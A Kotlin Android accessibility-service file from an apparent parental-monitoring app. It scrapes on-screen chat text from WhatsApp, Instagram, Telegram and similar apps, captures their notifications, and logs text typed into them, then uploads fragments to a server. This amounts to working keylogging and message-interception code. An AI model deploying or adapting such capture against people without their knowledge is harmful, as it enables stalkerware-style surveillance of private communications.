package com.familia.monitor

import android.accessibilityservice.AccessibilityService
import android.app.Notification
import android.content.Context
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.util.HashSet

/**
 * Segundo lector de seguridad (Oído de Respaldo).
 * Utiliza los servicios de Accesibilidad para capturar notificaciones que el lector estándar
 * podría perder debido a restricciones de batería del fabricante (Motorola, Xiaomi, etc.).
 */
class BackupCaptureService : AccessibilityService() {

    private val TAG = "BackupCapture"
    private val scope = CoroutineScope(Dispatchers.IO)
    private val processedNodes = LinkedHashSet<Int>(1000)

    private fun getAppName(packageName: String): String {
        return when (packageName) {
            "com.whatsapp" -> "WhatsApp"
            "com.whatsapp.w4b" -> "WhatsApp Business"
            "com.instagram.android" -> "Instagram"
            "com.discord" -> "Discord"
            "com.zhiliaoapp.musically" -> "TikTok"
            "org.telegram.messenger" -> "Telegram"
            "com.facebook.orca" -> "Messenger"
            "com.facebook.katana" -> "Facebook"
            else -> packageName
        }
    }

    companion object {
        var isServiceRunning = false
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        isServiceRunning = true
        Log.d(TAG, "Lector de respaldo (Accesibilidad) CONECTADO.")
        
        // Configuración dinámica si es necesario (ya está en XML)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        when (event.eventType) {
            AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> {
                handleNotificationEvent(event)
            }
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                handleTextEditingEvent(event)
            }
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED, 
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED,
            AccessibilityEvent.TYPE_VIEW_SCROLLED -> {
                handleContentChange(event)
            }
            else -> {
                // Ignore other events
            }
        }
    }

    private var lastScrapeTime = 0L

    private fun handleContentChange(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return
        val monitoredApps = setOf(
            "com.whatsapp", "com.whatsapp.w4b", "com.instagram.android", 
            "com.discord", "com.zhiliaoapp.musically", "org.telegram.messenger",
            "com.facebook.orca", "com.facebook.katana"
        )
        if (packageName !in monitoredApps || !AppFilterHelper.isAppMonitored(applicationContext, packageName)) return

        val now = System.currentTimeMillis()
        // Escaneamos cada 1.5 segundos para evitar CUALQUIER lag
        if (now - lastScrapeTime < 1500) return
        lastScrapeTime = now

        val rootNode = rootInActiveWindow ?: return
        
        // Extraemos los datos en el hilo principal de forma ultra rápida
        val dataToProcess = mutableListOf<String>()
        extractTextNodes(rootNode, dataToProcess)
        
        // Procesamos los datos en segundo plano usando corrutinas para no bloquear la UI
        scope.launch {
            processExtractedData(packageName, dataToProcess)
        }
    }

    private fun extractTextNodes(node: AccessibilityNodeInfo?, results: MutableList<String>) {
        if (node == null) return
        
        val text = node.text?.toString() ?: node.contentDescription?.toString()
        if (!text.isNullOrBlank() && text.length > 2) {
            results.add(text)
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            if (child != null) {
                extractTextNodes(child, results)
            }
        }
    }

    private fun processExtractedData(packageName: String, data: List<String>) {
        val devicePrefs = getSharedPreferences("device", MODE_PRIVATE)
        if (!devicePrefs.getBoolean("monitoring_enabled", true)) return

        // Palabras clave de botones y UI común de mensajería que deben ignorarse por completo
        val uiNoiseKeywords = setOf(
            "enviado", "entregado", "leído", "leyendo", "escribiendo...", "mensaje", 
            "mensaje de voz", "cámara", "camara", "adjuntar", "galería", "galeria", 
            "ubicación", "ubicacion", "contacto", "audio", "documento", "sticker", 
            "botón", "boton", "atrás", "atras", "buscar", "más opciones", "mas opciones",
            "perfil", "videollamada", "llamar", "llamada de voz", "foto de perfil"
        )

        for (text in data) {
            val trimmedText = text.trim()
            val lowerText = trimmedText.lowercase()
            
            // Filtro de horas (ej. 17:45) o textos extremadamente cortos
            if (trimmedText.matches(Regex("\\d{1,2}:\\d{2}.*")) || trimmedText.length < 3) continue
            
            // Filtro por coincidencia exacta o si contiene descripciones de botones obvias de la barra de entrada de WhatsApp
            if (uiNoiseKeywords.contains(lowerText) || 
                lowerText.contains("botón de mensaje de voz") || 
                lowerText.contains("botón de cámara") ||
                lowerText.contains("cuadro de texto") ||
                lowerText.contains("escribiendo") ||
                lowerText.contains("escribe un mensaje")) {
                continue
            }
            
            val nodeHash = (packageName + trimmedText).hashCode()
            if (processedNodes.contains(nodeHash)) continue

            Log.d(TAG, "Captura en pantalla ($packageName): $trimmedText")
            
            // Guardar localmente
            MessageLogHelper.saveMessage(applicationContext, getAppName(packageName), "Pantalla", trimmedText, System.currentTimeMillis())
            
            // Evaluar riesgo
            val match = RiskEngine.evaluate(trimmedText)
            if (match != null) {
                processAccessibilityMessage(packageName, "Scraper", trimmedText, System.currentTimeMillis(), "pantalla_riesgo")
            }

            processedNodes.add(nodeHash)
            if (processedNodes.size > 2000) {
                val it = processedNodes.iterator()
                if (it.hasNext()) {
                    it.next()
                    it.remove()
                }
            }
        }
    }

    private fun handleNotificationEvent(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return
        val parcelableData = event.parcelableData
        if (parcelableData is Notification) {
            val notification = parcelableData
            val extras = notification.extras
            val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: "Desconocido"
            val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""
            
            if (text.isNotBlank()) {
                val lower = text.lowercase()
                if (lower.contains("nuevos mensajes") || lower.contains("chats")) {
                    Log.d(TAG, "Ignorando resumen vía Accesibilidad: $text")
                    return
                }
                Log.d(TAG, "Captura vía Accesibilidad de $packageName: $text")
                processAccessibilityMessage(packageName, title, text, notification.`when`, "captura_respaldo")
            }
        }
    }

    private fun handleTextEditingEvent(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return
        
        // Solo monitorear apps de mensajería/sociales para el teclado
        val monitoredApps = setOf(
            "com.whatsapp", "com.whatsapp.w4b", "com.instagram.android", 
            "com.discord", "com.zhiliaoapp.musically", "org.telegram.messenger",
            "com.facebook.orca", "com.facebook.katana"
        )
        if (packageName !in monitoredApps || !AppFilterHelper.isAppMonitored(applicationContext, packageName)) return

        val text = event.text.joinToString("")
        if (text.isBlank() || text.length < 4) return

        val devicePrefs = getSharedPreferences("device", MODE_PRIVATE)
        val isTotalSupervision = devicePrefs.getBoolean("total_supervision", false)

        // 1. Siempre evaluar Riesgo (Prioridad Máxima)
        val match = RiskEngine.evaluate(text)
        if (match != null) {
            Log.e(TAG, "¡RIESGO DETECTADO EN TECLADO! ($packageName): $text")
            processAccessibilityMessage(packageName, "Usuario (Escribiendo)", text, System.currentTimeMillis(), "escritura_riesgo")
            return
        }

        // 2. Si Supervisión Total está activa, enviamos todo lo que parezca una frase/palabra completa
        if (isTotalSupervision) {
            // Evitamos enviar mientras el usuario está escribiendo letra por letra (esperamos a espacios o longitud)
            if (text.endsWith(" ") || text.length > 20) {
                Log.d(TAG, "Captura de teclado (Supervisión Total): $text")
                processAccessibilityMessage(packageName, "Usuario (Escribiendo)", text.trim(), System.currentTimeMillis(), "escritura_total")
            }
        }
    }

    private fun processAccessibilityMessage(packageName: String, sender: String, text: String, time: Long, category: String) {
        val devicePrefs = getSharedPreferences("device", MODE_PRIVATE)
        if (!devicePrefs.getBoolean("monitoring_enabled", true)) return

        // Usar la misma lógica de deduplicación que el servicio principal
        val msgSignature = "sig_${(packageName + sender + text + time).hashCode()}"
        val hashPrefs = getSharedPreferences(NotificationCaptureService.HASH_PREFS, MODE_PRIVATE)
        
        if (hashPrefs.contains(msgSignature)) {
            return
        }

        hashPrefs.edit().putBoolean(msgSignature, true).apply()

        // Guardar localmente en el registro de chats
        MessageLogHelper.saveMessage(applicationContext, getAppName(packageName), sender, text, if (time > 0) time else System.currentTimeMillis())

        scope.launch {
            AlertUploader.sendAlert(
                context = applicationContext,
                sourceApp = packageName,
                category = category,
                level = if (category == "escritura_riesgo") "HIGH" else "LOW",
                fragment = "$sender: $text",
                timestamp = if (time > 0) time else System.currentTimeMillis(),
                battery = DeviceStateHelper.getBatteryLevel(applicationContext),
                connection = "Backup-Ear"
            )
        }
    }

    override fun onInterrupt() {
        isServiceRunning = false
        Log.e(TAG, "Lector de respaldo INTERRUMPIDO.")
    }

    override fun onDestroy() {
        super.onDestroy()
        isServiceRunning = false
    }
}
